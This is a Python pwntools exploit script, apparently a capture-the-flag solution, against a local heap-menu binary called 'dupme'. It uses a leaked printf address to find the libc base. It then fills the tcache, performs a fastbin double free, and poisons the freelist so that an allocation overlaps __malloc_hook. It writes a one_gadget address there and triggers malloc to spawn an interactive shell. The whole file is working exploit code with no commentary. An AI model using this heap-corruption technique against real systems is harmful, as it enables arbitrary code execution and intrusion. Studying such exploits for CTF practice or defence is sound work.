
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
p=process("./dupme")
libc = ELF("./libc.so.6")
#gdb.attach(p)
context.arch="amd64"

def malloc1(ind, size, payload):
    global p
    a1 = p.sendlineafter(b">", "1")
    a2 = p.sendlineafter(b">", str(ind))
    a3 = p.sendlineafter(b">", str(size))
    a4 = p.sendlineafter(b">",payload) 
    return a1+a2+a3+a4

def malloc2(ind, size, payload):
    global p
    a1 = p.sendlineafter(b">", "1")
    a2 = p.sendlineafter(b">", str(ind))
    a3 = p.sendlineafter(b">", str(size))
    return a1+a2+a3

def free(ind):
    global p
    a1 = p.sendlineafter(b">", "2")
    a2 = p.sendlineafter(b">", str(ind))
    return a1 + a2

def edit(ind, payload):
    global p
    a1 = p.sendlineafter(b">","3")
    a2 = p.sendlineafter(b">",str(ind))
    a3 = p.sendlineafter(b">",payload)
    return a1+a2+a3

def view(ind):
    global p
    a1 = p.sendlineafter(b">", "4")
    a1 = p.sendlineafter(b">", "4")
    a2 = p.sendlineafter(b">", str(ind))
    leak = p.recvuntil(b"addresses.");
    return leak
p.recvuntil(b"0x")
leak = p.recvuntil("\n")
intleak = int(leak,16)
print(hex(intleak))

libc.address = intleak - libc.sym.printf
print(hex(libc.address))

for i in range(9):
    print(malloc1(i,104,"junk"))

for i in range(7):
    free(i)

free(7)
free(8)
free(7)

for i in range(7):
    malloc1(i, 104, "data")

malloc1(9, 104, p64(libc.sym.__malloc_hook - 35))
malloc1(10, 104, "data")
malloc1(11, 104, "data")
malloc1(12, 104, b'a'*35 + p64(0xe27a1 + libc.address))
malloc2(13, 104, "data")
p.interactive()
